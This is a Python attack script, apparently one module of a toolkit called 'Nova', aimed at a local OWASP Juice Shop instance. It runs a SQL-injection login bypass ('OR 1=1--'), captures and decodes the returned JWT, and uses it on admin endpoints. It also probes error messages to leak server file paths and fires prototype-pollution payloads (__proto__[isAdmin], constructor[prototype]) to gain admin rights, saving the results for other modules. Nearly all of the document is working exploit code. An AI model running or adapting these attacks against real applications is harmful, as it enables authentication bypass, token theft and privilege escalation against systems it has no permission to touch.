#!/usr/bin/env python3
"""
NOVA SHARPENING PATCH v1.0
Fixes three weak spots in the arsenal:
1. JWT Forge - proper token extraction from JSON responses
2. Path Extractor - wires Adaptive Brain leaks into Dropper
3. Proto Polluter - adds form-urlencoded nested object injection
"""

import json
import re
import base64
import requests
import sys
import os

# Add current dir to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ---------- FIX 1: JWT TOKEN EXTRACTION ----------
def patch_jwt_forge():
    """Fix the JWT Forge to properly extract tokens from auth bypass responses."""
    print("""
╔══════════════════════════════════════════╗
║  🔧 PATCH 1: JWT Token Extraction      ║
╚══════════════════════════════════════════╝""")
    
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})
    
    # Step 1: Perform the auth bypass that we know works
    print("\n  📡 Performing auth bypass...")
    login_data = {"email": "' OR 1=1--", "password": "anything"}
    resp = session.post("http://localhost:3000/rest/user/login", json=login_data)
    
    print(f"     Status: {resp.status_code}")
    print(f"     Response preview: {resp.text[:200]}")
    
    # Step 2: Extract token from JSON response
    token = None
    try:
        json_body = resp.json()
        print(f"\n  📦 Parsed JSON: {json.dumps(json_body, indent=2)[:300]}")
        
        # Extract authentication token
        if "authentication" in json_body:
            auth = json_body["authentication"]
            if isinstance(auth, dict):
                token = auth.get("token") or auth.get("sid") or auth.get("access_token")
            elif isinstance(auth, str):
                token = auth
            print(f"     🔑 Token from 'authentication': {token[:50] if token else 'NOT FOUND'}...")
        
        if not token:
            # Try other common fields
            for field in ["token", "sid", "access_token", "id_token", "jwt"]:
                if field in json_body:
                    token = json_body[field]
                    print(f"     🔑 Token from '{field}': {token[:50]}...")
                    break
        
        # Fallback: search entire response for JWT pattern
        if not token:
            jwt_pattern = r'(eyJ[A-Za-z0-9\-._~+/]+=*)'
            matches = re.findall(jwt_pattern, resp.text)
            if matches:
                token = matches[0]
                print(f"     🔑 Token from JWT pattern: {token[:50]}...")
                
    except json.JSONDecodeError:
        print("     ⚠️ Response is not JSON, searching for tokens...")
        jwt_pattern = r'(eyJ[A-Za-z0-9\-._~+/]+=*)'
        matches = re.findall(jwt_pattern, resp.text)
        if matches:
            token = matches[0]
            print(f"     🔑 Token from JWT pattern: {token[:50]}...")
    
    # Step 3: Analyze the actual token
    if token:
        print(f"\n  🔍 Analyzing captured token...")
        try:
            # Decode JWT
            parts = token.split(".")
            if len(parts) == 3:
                for i, name in enumerate(["header", "payload"]):
                    padded = parts[i] + "=" * (4 - len(parts[i]) % 4)
                    decoded = base64.urlsafe_b64decode(padded)
                    parsed = json.loads(decoded.decode())
                    print(f"     {name}: {json.dumps(parsed, indent=2)[:300]}")
        except Exception as e:
            print(f"     ⚠️ Could not decode: {str(e)[:100]}")
        
        # Step 4: Test the token
        print(f"\n  🧪 Testing token on protected endpoints...")
        test_endpoints = [
            "/rest/user/whoami",
            "/api/Users", 
            "/rest/admin/application-configuration",
        ]
        for endpoint in test_endpoints:
            resp = session.get(f"http://localhost:3000{endpoint}", 
                headers={"Authorization": f"Bearer {token}"})
            icon = "✅" if resp.status_code == 200 else "❌"
            print(f"     {icon} {endpoint}: {resp.status_code} ({len(resp.text)} bytes)")
            if resp.status_code == 200:
                print(f"        Preview: {resp.text[:150]}")
        
        # Save for other modules
        with open("nova_extracted_token.json", "w") as f:
            json.dump({"token": token, "source": "auth_bypass"}, f, indent=2)
        print(f"\n  💾 Token saved to nova_extracted_token.json")
    else:
        print("\n  ❌ No token extracted from auth bypass response")
    
    return token


# ---------- FIX 2: PATH EXTRACTOR ----------
def patch_path_extractor():
    """Extract file paths from all previous findings and feed to Dropper."""
    print("""
╔══════════════════════════════════════════╗
║  🔧 PATCH 2: Path Extraction & Wiring  ║
╚══════════════════════════════════════════╝""")
    
    leaked_paths = []
    
    # Check session hijack report
    try:
        with open("nova_session_hijack_report.json", "r") as f:
            report = json.load(f)
            # Search for paths in any session data
            report_str = json.dumps(report)
            paths = re.findall(r'(/(?:[\w.-]+/)+[\w.-]+\.[\w]+)', report_str)
            leaked_paths.extend(paths)
    except:
        pass
    
    # Run a fresh probe to extract paths
    print("\n  📡 Probing endpoints for path leaks...")
    session = requests.Session()
    
    probes = [
        ("/rest/user/login", {"email": "'", "password": "'"}),
        ("/rest/user/register", {"email": "'", "password": "'"}),
        ("/rest/products/search", None),
        ("/api/Feedbacks", {"comment": "'"}),
        ("/rest/order-history", None),
    ]
    
    for endpoint, data in probes:
        try:
            if data:
                resp = session.post(f"http://localhost:3000{endpoint}", json=data, timeout=10)
            else:
                resp = session.get(f"http://localhost:3000{endpoint}", 
                    params={"q": "'"}, timeout=10)
            
            # Extract paths from error messages
            path_patterns = [
                r'(/[\w/.-]+\.js)',           # JavaScript files
                r'(/[\w/.-]+\.json)',         # JSON files
                r'(/[\w/.-]+\.yml)',          # YAML files
                r'at\s+(/[\w/.-]+\.js)',      # Stack trace paths
                r'File\s+"([^"]+)"',          # File references
            ]
            
            for pattern in path_patterns:
                matches = re.findall(pattern, resp.text)
                for match in matches:
                    if match not in leaked_paths and len(match) > 5:
                        leaked_paths.append(match)
                        print(f"     📁 {endpoint}: {match}")
        except:
            pass
    
    # Deduplicate and save
    leaked_paths = list(set(leaked_paths))
    
    if leaked_paths:
        print(f"\n  📊 Extracted {len(leaked_paths)} unique file paths")
        for path in leaked_paths[:10]:
            print(f"     📁 {path}")
        
        with open("nova_leaked_paths.json", "w") as f:
            json.dump({"leaked_paths": leaked_paths, "count": len(leaked_paths)}, f, indent=2)
        print(f"  💾 Paths saved to nova_leaked_paths.json")
    else:
        print("\n  ⚠️ No file paths extracted from probes")
    
    return leaked_paths


# ---------- FIX 3: PROTO POLLUTER FORM-URLENCODED ----------
def patch_proto_polluter():
    """Add form-urlencoded nested object injection for Express apps."""
    print("""
╔══════════════════════════════════════════╗
║  🔧 PATCH 3: Proto via Form-URLEncoded ║
╚══════════════════════════════════════════╝""")
    
    session = requests.Session()
    findings = []
    
    # Express apps parse nested objects from form-urlencoded
    # __proto__[isAdmin]=true becomes {__proto__: {isAdmin: true}}
    targets = [
        {
            "endpoint": "/rest/user/login",
            "data": {
                "email": "admin@juice-sh.op",
                "password": "anything",
                "__proto__[isAdmin]": "true",
                "__proto__[role]": "admin",
            }
        },
        {
            "endpoint": "/rest/user/register", 
            "data": {
                "email": "nova_proto_test@juice-sh.op",
                "password": "Test123!",
                "securityQuestion": "color?",
                "securityAnswer": "blue",
                "__proto__[isAdmin]": "true",
                "__proto__[role]": "admin",
            }
        },
        {
            "endpoint": "/api/Feedbacks",
            "data": {
                "comment": "test feedback",
                "rating": "5",
                "__proto__[isAdmin]": "true",
                "constructor[prototype][admin]": "true",
            }
        },
    ]
    
    for target in targets:
        print(f"\n  🎯 Testing: {target['endpoint']}")
        
        # Baseline without pollution
        clean_data = {k: v for k, v in target["data"].items() 
                      if not k.startswith("__") and not k.startswith("constructor")}
        
        try:
            resp_clean = session.post(
                f"http://localhost:3000{target['endpoint']}",
                data=clean_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=10
            )
            clean_status = resp_clean.status_code
            clean_len = len(resp_clean.text)
            print(f"     Clean: {clean_status} ({clean_len} bytes)")
        except:
            clean_status = 0
            clean_len = 0
        
        # With pollution
        try:
            resp_polluted = session.post(
                f"http://localhost:3000{target['endpoint']}",
                data=target["data"],
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=10
            )
            poll_status = resp_polluted.status_code
            poll_len = len(resp_polluted.text)
            print(f"     Polluted: {poll_status} ({poll_len} bytes)")
            
            # Check for indicators
            indicators = []
            body_lower = resp_polluted.text.lower()
            if "admin" in body_lower: indicators.append("admin_visible")
            if "token" in body_lower: indicators.append("token_obtained")
            if "isadmin" in body_lower: indicators.append("isadmin_true")
            if poll_status == 200 and clean_status != 200: indicators.append("auth_bypass")
            
            if indicators:
                findings.append({
                    "endpoint": target["endpoint"],
                    "indicators": indicators,
                    "response_preview": resp_polluted.text[:300],
                })
                print(f"     🔥 POTENTIAL POLLUTION: {indicators}")
            
            # Also try JSON format with parsed __proto__
            json_payload = {"__proto__": {"isAdmin": True, "role": "admin"}}
            for k, v in target["data"].items():
                if not k.startswith("__") and not k.startswith("constructor"):
                    json_payload[k] = v
            
            resp_json = session.post(
                f"http://localhost:3000{target['endpoint']}",
                json=json_payload,
                timeout=10
            )
            print(f"     JSON proto: {resp_json.status_code} ({len(resp_json.text)} bytes)")
            
        except Exception as e:
            print(f"     ❌ Error: {str(e)[:100]}")
    
    if findings:
        print(f"\n  🔥 {len(findings)} potential pollution findings!")
        with open("nova_proto_form_findings.json", "w") as f:
            json.dump(findings, f, indent=2)
    else:
        print("\n  ✅ No pollution indicators found via form-urlencoded")
    
    return findings


# ---------- RUN ALL PATCHES ----------
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════╗
║                                              ║
║   🔧 NOVA SHARPENING PATCH SUITE v1.0      ║
║   Fixing 3 Weak Spots in the Arsenal       ║
║                                              ║
╚══════════════════════════════════════════════╝
    """)
    
    results = {}
    
    # Patch 1: Proper JWT extraction
    token = patch_jwt_forge()
    results["jwt_token_extracted"] = token is not None
    
    # Patch 2: Path extraction
    paths = patch_path_extractor()
    results["paths_extracted"] = len(paths)
    
    # Patch 3: Proto via form-urlencoded
    proto_findings = patch_proto_polluter()
    results["proto_pollution_findings"] = len(proto_findings)
    
    # Summary
    print(f"""
╔══════════════════════════════════════════╗
║        SHARPENING COMPLETE              ║
╠══════════════════════════════════════════╣
║  JWT Token Extracted:  {str(results['jwt_token_extracted']):>5}            ║
║  File Paths Leaked:    {results['paths_extracted']:>3}               ║
║  Proto Findings:       {results['proto_pollution_findings']:>3}               ║
╚══════════════════════════════════════════╝
    """)
    
    print("💡 To update Nova with these fixes:")
    print("   1. The extracted token is in nova_extracted_token.json")
    print("   2. Leaked paths are in nova_leaked_paths.json")
    print("   3. Proto findings are in nova_proto_form_findings.json")
    print("\n   Run nova_core.py again to use these improvements.")
